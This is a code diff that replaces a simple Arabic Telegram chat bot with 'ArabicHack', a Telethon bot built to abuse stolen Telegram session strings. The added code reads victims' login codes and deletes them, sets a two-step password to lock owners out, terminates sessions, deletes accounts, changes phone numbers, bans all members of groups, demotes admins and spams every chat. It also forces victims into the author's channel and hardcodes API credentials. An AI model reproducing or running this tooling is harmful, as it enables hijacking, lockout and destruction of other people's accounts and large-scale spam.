-	if message.text == "غنيلي" or message.text == "غ":
-		song_str = random.randint(74,154)
-		song_voice = "https://t.me/DjAseel/" + str(song_str)
-		bot.send_audio(message.chat.id,song_voice,"""*✯ تم ختيار اغنية لك، 
-- @Sss0s0bot*""",parse_mode="markdown",reply_to_message_id=message.message_id,reply_markup=p3)
-	if message.text == "هلو":
-		bot.reply_to(message,"هلوات يروحي 😍")
-	elif message.text == "وين":
-		bot.reply_to(message,"ارد اشرد الـ الله")
-	elif message.text=="باي":
-		bot.reply_to(message,"ون.")
-	elif message.text=="صباح الخير":
-			bot.reply_to(message,".صباඋ النوࢪ 😻")
-	elif message.text=="هاي":
-			bot.reply_to(message,".هايات يعمࢪي 💖")
-	elif message.text=="شلونك":
-			bot.reply_to(message,"تمام وانت 🌹")
-	elif message.text=="احبك":
-			bot.reply_to(message,"جذب تحب عشره عليك")
-	elif message.text=="احبج":
-			bot.reply_to(message,"امشي لك زاحف 😒")
-	elif message.text=="نجب":
-			bot.reply_to(message,"نجب انت لك ادبسز")
-	elif message.text=="اكلك":
-		bot.reply_to(message,"كول عمري ")
-	elif message.text=="شوكت تجي":
-		bot.reply_to(message,"من تروح انت 😒😒✋،!!¿.")
-	elif message.text=="بوت":
-		bot.reply_to(message,"اسمي ↫ 𝐒𝐀𝐃𝐑𝐄 افتهم عادد")
-		
-	elif "حسابي" in message.text or "حسابج" in message.text or "حساب"in message.text:
-		bot.reply_to(message,"شنو طار ؟؟")#جمع الاوامر 
+async def promote(strses, grp, user):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    try:
+      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
+    except:
+      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
+    
+async def user2fa(strses):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    try:
+      await X.edit_2fa('ArabicHack IS BEST')
+      return True
+    except:
+      return False
 
-	elif message.text =="السلام عليكم":
-		bot.reply_to(message,"عليكم السلام ورحمة الله 😻")
-	elif message.text=="مور":
-		bot.reply_to(message,"ﻣﻣح")
-	elif message.text=="شكرا":
-		bot.reply_to(message,"دلࢦـَِ.")
-	elif message.text=="🥺":
-		bot.reply_to(message,"ڪيوت.")
-	elif message.text =="وين":
-	  bot.reply_to(message,"ارد اشرد اللله.")
-	elif message.text =="بايات":
-	  bot.reply_to(message,"وجعاا حته مرض ليش ترد ")
-	 
-	elif message.text =="تعال" :
-		bot.reply_to(message,"اني صحتلك وانت جيت شتريد")
+async def demall(strses, grp):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
+      try:
+        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
+      except:
+        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
+      
 
-	  
-	
-	m = message.text	
-	if m == "التقويم" or m == "تقويم" or m == "السنة" or m == "التاريخ":
-		p3 = types.InlineKeyboardMarkup()
-		p5 = types.InlineKeyboardButton(text = "[!] 𝗚𝗛𝗢𝗦𝗧 ^ 𝗦𝗢𝗨𝗥𝗖𝗘 🇰🇼",url="t.me/pjpppppp")
-		
-		p3.add(p5)
-		t = time.strftime("%p%H:%S")
-		t = time.strftime("%Y/%m/%d %A %b")
-		bot.reply_to(message,f"التقويم ⇜{t}",reply_markup=p3)
-	
-			
-	m = message.text
-	if m == "الساعة" or m == "الساعه" or m == "الوقت":
-		p3 = types.InlineKeyboardMarkup()
-		p5 = types.InlineKeyboardButton(text = "[!] 𝗚𝗛𝗢𝗦𝗧 ^ 𝗦𝗢𝗨𝗥𝗖𝗘 🇰🇼",url="t.me/pjpppppp")
-		p3.add(p5)
-		t = time.strftime("%p %H:%S")
-		bot.reply_to(message,f"الساعة ⇜{t}",reply_markup=p3)	
-	m = message.text
-	if m == "صورتي" or m == "الصورة" or m == "بروفايلي":
-		url = f"https://t.me/{message.from_user.username}"
-		bot.send_photo(message.chat.id,url,reply_to_message_id=message.message_id)
-	if "كول" in message.text:
-	 m = message.text
-	 k = "ماشتغل عندك حته اا"
-	 rep=str(message.text).split("كول")
-	 bot.reply_to(message,k+m)	
-	m = message.text		
-	if m == "الرابط" or m == "رابط" :
-		l = bot.export_chat_invite_link(message.chat.id)
-		bot.reply_to(message,f"""*رابط المجموعة ↩️ : 
-{l}*""",parse_mode="markdown")
-	     	
-	if message.text == "ذ" or message.text == "ذكر" or message.text == "ايه" or message.text == "اية" or message.text == "اذكار":
-	  p3 = types.InlineKeyboardMarkup()
-	  p5 = types.InlineKeyboardButton(text = "[!] 𝗚𝗛𝗢𝗦𝗧 ^ 𝗦𝗢𝗨𝗥𝗖𝗘 🇰🇼",url="t.me/pjpppppp")
-	  url = "https://ApiAzkar.amoapi.repl.co"
-	  msg = message.text
-	  p3.add(p5)
-	  t = requests.get(url).text
-	  j = """   بــــــسم الله الــــــࢪحــــمٰـــن الـــــࢪحـــيــم
-     ============================"""
-	  bot.reply_to(message,f"*{j}\n{t}*",parse_mode="markdown",reply_markup=p3)
 
-	if message.text == 'كت' or message.text == 'كت تويت' or message.text == "تت":
+async def joingroup(strses, username):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    await X(join(username))
 
-	    	p3 = types.InlineKeyboardMarkup()
-	    	p5 = types.InlineKeyboardButton(text = "[!] 𝗚𝗛𝗢𝗦𝗧 ^ 𝗦𝗢𝗨𝗥𝗖𝗘 🇰🇼",url="t.me/pjpppppp")
-	    	p4 = types.InlineKeyboardButton(text ='↫التالي↬', callback_data= 'c2')
-	    	r = random.choice(abod)
-	    	p3.add(p4)
-	    	p3.add(p5)
-	    	bot.reply_to(message,f"""*{r}
-- - - - - - - - - - - - - 
-@Tuupacbot*""",parse_mode="markdown",reply_markup=p3)
-@bot.callback_query_handler(func= lambda call : True)
-def callback_data(call):
+
+async def leavegroup(strses, username):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    await X(leave(username))
+
+async def delgroup(strses, username):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    await X(dc(username))
+    
+
+async def cu(strses):
+  try:
+    async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+        k = await X.get_me()
+        return [str(k.first_name), str(k.username or k.id)]
+  except Exception as e:
+    return False
+
+async def usermsgs(strses):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    i = ""
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    async for x in X.iter_messages(777000, limit=3):
+      i += f"\n{x.text}\n"
+    await client.delete_dialog(777000)
+    return str(i)
+
+
+async def userbans(strses, grp):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    k = await X.get_participants(grp)
+    for x in k:
+      try:
+        await X.edit_permissions(grp, x.id, view_messages=False)
+      except:
+        pass
+    
+
+
+async def userchannels(strses):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    k = await X(pc())
+    i = ""
+    for x in k.chats:
+      try:
+        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
+      except:
+        pass
+    return str(i)
+
+
+
+import logging
+logging.basicConfig(level=logging.WARNING)
+
+channel = "SAYTHONH"
+menu = '''
+
+**"A" :~ [Check user own groups and channels]
+
+"B" :~ [Check user all information like phone number, usrname... etc]
+
+"C" :~ [Ban a group {give me StringSession and channel/group username i will ban all members there}]
+
+"D" :~ [Know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
+
+"E" :~ [Join A Group/Channel via StringSession]
+
+"F" :~ [Leave A Group/Channel via StringSession]
+
+"G" :~ [Delete A Group/Channel]
+
+"H" :~ [Check user two step is eneable or disable]
+
+"I" :~ [Terminate All current active sessions except Your StringSession]
+
+"J" :~ [Delete Account]
+
+"K" :~ [Demote all admins in a group/channel]
+
+"L" ~ [Promote a member in a group/channel]
+
+"M" ~ [Change Phone number using StringSession]
+
+"N" ~ [Spam commands]
+
+BY SOMY TEAM
+
+
+I will add more features Later 😅**
+'''
+mm = '''
+**⚜NOTICE FIRST JOIN SUPPORT @SAYTHONH⚜**
+'''
+
+keyboard = [
+  [  
+    Button.inline("A", data="A"), 
+    Button.inline("B", data="B"),
+    Button.inline("C", data="C"),
+    Button.inline("D", data="D"),
+    Button.inline("E", data="E")
+    ],
+  [
+    Button.inline("F", data="F"), 
+    Button.inline("G", data="G"),
+    Button.inline("H", data="H"),
+    Button.inline("I", data="I"),
+    Button.inline("J", data="J"),
+    ],
+  [
+    Button.inline("K", data="K"), 
+    Button.inline("L", data="L"),
+    Button.inline("M", data="M"),
+    Button.inline("N", data="N"),
+    ],
+  [
+    Button.url("Owner", "https://t.me/T_4_Z")
+    ]
+]
+
+@client.on(events.NewMessage(pattern="/start"))
+async def op(event):
+  global mm
+  if not event.is_private:
+    ArabicHack = [
+      [
+        Button.url("Click Here", f"https://t.me/SESSIONHACKABOT?start=hack")
+        ]
+      ]         
+    await event.reply("Click Below To Use Me", buttons=ArabicHack)
+  else:
+    legendbye = [
+      [
+        Button.url("Must Join", f"https://t.me/SAYTHONH")
+        ]
+      ]
+    await event.reply("First Join Channel!\n Then Try Click Here ~ /hack", buttons=legendbye)
+    
+       
+@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
+async def op(event):
+  ArabicHack = [
+    [
+      Button.url("Click Here", f"https://t.me/")
+      ]
+    ]         
+  await event.reply("Click Below To Use Me", buttons=ArabicHack)
   
-  if call.data == "c2":
-  	r = random.choice(abod)
-  	p3 = types.InlineKeyboardMarkup()
-  	p5 = types.InlineKeyboardButton(text = "[!] 𝗚𝗛𝗢𝗦𝗧 ^ 𝗦𝗢𝗨𝗥𝗖𝗘 🇰🇼",url="t.me/pjpppppp")
-  	p4 = types.InlineKeyboardButton(text ='↫التالي↬', callback_data= 'c2')
-  	p3.add(p4)
-  	p3.add(p5)
-  	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"""*{r}
-- - - - - - - - - - - - - -
-@Tuupacbot*""",reply_markup=p3,parse_mode="markdown")
-  p3 = types.InlineKeyboardMarkup()
-  s0 = types.InlineKeyboardButton(text = "رجوع",callback_data="s0")
-  A1 = types.InlineKeyboardButton(text = "اوامر الحماية .",callback_data="A1")
-  A2 = types.InlineKeyboardButton(text = "اوامر التسلية .",callback_data="A2")
-  A3 = types.InlineKeyboardButton(text = "اوامر الالعاب .",callback_data="A3")
-  A4 = types.InlineKeyboardButton(text = "اوامر الموسيقى ",callback_data="A4")
-  p3.add(A1,A2)
-  p3.add(A3,A4)
-  if call.data == "s0":
-  	f2 = call.from_user.first_name
-  	t2 = call.from_user.username
-  	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="""*اهلا بك عزيزي - *[{}](t.me/{})،
-*  في اوامر البوت، 
-اختر من الازرار،*
-""".format(f2,t2),disable_web_page_preview=True,parse_mode="markdown",reply_markup=p3)
-  
-  if call.data == "A1":
-      p3 = types.InlineKeyboardMarkup()
-      s0 = types.InlineKeyboardButton(text = "رجوع",callback_data="s0")
-      p3.add(s0)
-      bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="""*اوامر الحماية
-  - - - - - - - - - - - - - 
- حظر <<
- الغاء حظر << 
- كتم <<
- الغاء كتم <<
- تقيد <<
- ايدي <<
- كشف بالرد <<
- حسابي <<
- صورتي <<
- اسمي <<
- الوقت <<
- التاريخ <<
- تاك باليوزر <<
- الرابط <<
- المطور <<*""",parse_mode="markdown",reply_markup=p3)
-  
-#####+#####
-u = 70
-a = 1
-uu = u - a 
-print(f"f > m  = {uu}")
-bot.polling()
+@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
+async def start(event):
+  global menu
+  async with bot.conversation(event.chat_id) as x:
+    keyboard = [
+      [  
+        Button.inline("A", data="A"), 
+        Button.inline("B", data="B"),
+        Button.inline("C", data="C"),
+        Button.inline("D", data="D"),
+        Button.inline("E", data="E")
+        ],
+      [
+        Button.inline("F", data="F"), 
+        Button.inline("G", data="G"),
+        Button.inline("H", data="H"),
+        Button.inline("I", data="I"),
+        Button.inline("J", data="J")
+        ],
+      [
+        Button.inline("K", data="K"), 
+        Button.inline("L", data="L"),
+        Button.inline("M", data="M"),
+        Button.inline("N", data="N"),
+        ],
+      [
+        Button.url("Owner", "https://t.me/t_4_z")
+        ]
+    ]
+    await x.send_message(f"Choose what you want with string session \n\n{menu}", buttons=keyboard)
+    
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession Has Been Terminated.\n /hack", buttons=keyboard)
+      try:
+        i = await userchannels(strses.text)
+      except:
+        return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
+      if len(i) > 3855:
+        file = open("session.txt", "w")
+        file.write(i + "\n\nDetails BY @T_4_Z")
+        file.close()
+        await bot.send_file(event.chat_id, "session.txt")
+        system("rm -rf session.txt")
+      else:
+        await event.reply(i + "\n\nThanks For using ArabicHackBot. \n/hack", buttons=keyboard)
+      
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
+    i = await userinfo(strses.text)
+    await event.reply(i + "\n\nThanks For using ArabicHack Bot.\n/hack", buttons=keyboard)
+    
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("String Session Has Been Terminated", buttons=keyboard)
+    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+    grpid = await x.get_response()
+    await userbans(strses.text, grpid.text)
+    await event.reply("Banning all members. Thanks For using ArabicHack Bot", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+      i = await usermsgs(strses.text)
+      await event.reply(i + "\n\nThanks For using ArabicHack Bot", buttons=keyboard)
+    
+      
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+    grpid = await x.get_response()
+    await joingroup(strses.text, grpid.text)
+    await event.reply("Joined the Channel/Group Thanks For using ArabicHack Bot", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+    grpid = await x.get_response()
+    await leavegroup(strses.text, grpid.text)
+    await event.reply("Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard)
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+      grpid = await x.get_response()
+      await delgroup(strses.text, grpid.text)
+      await event.reply("Deleted the Channel/Group Thanks For using ArabicHackBot.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession is terminated maybe.", buttons=keyboard)
+      i = await user2fa(strses.text)
+      if i:
+        await event.reply("User don't have two step thats why now two step is `ArabicHack Bot Is best` you can login now\n\nThanks For using ArabicHack Bot.", buttons=keyboard)
+      else:
+        await event.reply("Sorry User Have two step already", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+      i = await terminate(strses.text)
+      await event.reply("The all sessions are terminated\n\nThanks For using ArabicHackBot.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+      i = await delacc(strses.text)
+      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using ArabicHack Bot.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+      grp = await x.get_response()
+      await x.send_message("NOW GIVE USER USERNAME")
+      user = await x.get_response()
+      i = await promote(strses.text, grp.text, user.text)
+      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+      pro = await x.get_response()
+      try:
+        i = await demall(strses.text, pro.text)
+      except:
+        pass
+      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using ArabicHackBot.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession is terminated maybe", buttons=keyboard)
+      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
+      number = (await x.get_response()).text
+      try:
+        result = await change_number(strses.text, number)
+        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+        await asyncio.sleep(20)
+        await x.send_message("NOW GIVE PHONE CODE HASH")
+        phone_code_hash = (await x.get_response()).text
+        await x.send_message("NOW GIVE THE OTP")
+        otp = (await x.get_response()).text
+        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
+        if changing:
+          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
+        else:
+          await event.respond("Something is wrong")
+      except Exception as e:
+        await event.respond("SEND THIS ERROR TO - @SAYTHONH\n**LOGS**\n" + str(e))
+
+
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
+async def start(event):
+    keyboard = [
+      [  
+        Button.inline("a", data="a"), 
+        Button.inline("b", data="b"),
+        Button.inline("c", data="c"),
+        ],
+      [
+        Button.url("Owner", "https://t.me/T_4_Z")
+        ]
+    ]
+    await event.reply("Now Give Me Flag Where U Want to Gcast \n✓ For All - Choose a\n✓ For Group - Choose b\n✓ For Private - Choose c", buttons=keyboard)
+
+
+
+async def gcasta(strses, msg):
+    async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+        try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for aman in X.iter_dialogs():
+                chat = aman.id
+                try:
+                    await X.send_message(chat, tol, file=file)     
+                    if lol != -1001551357238:
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                    elif chat == -1001606996743:
+                        pass
+                    await asyncio.sleep()
+                except Exception as e:
+                    print(e)
+        except Exception as e:
+            print(e)        
+
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+      await x.send_message("NOW GIVE MSG")
+      msg = await x.get_response()
+      await x.send_message("Now Done It Will Send message automatically every 10 min")
+      i = await gcasta(strses.text, msg.text)
+      await event.reply(f"Done Gcasted In {i} all 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
+
+molb = True
+
+async def gcastb(strses, msg):
+    async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+        try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for sweetie in X.iter_dialogs():
+                if sweetie.is_group:
+                    chat = sweetie.id
+                    try:
+                        if chat != -1001606996743:
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(600)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(600)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            while molb != False:
+                                await asyncio.sleep(600)
+                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
+                        elif chat == -1001606996743:
+                            pass
+                    except Exception as e:
+                        print(e)
+        except Exception as e:
+            print(e)
+
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
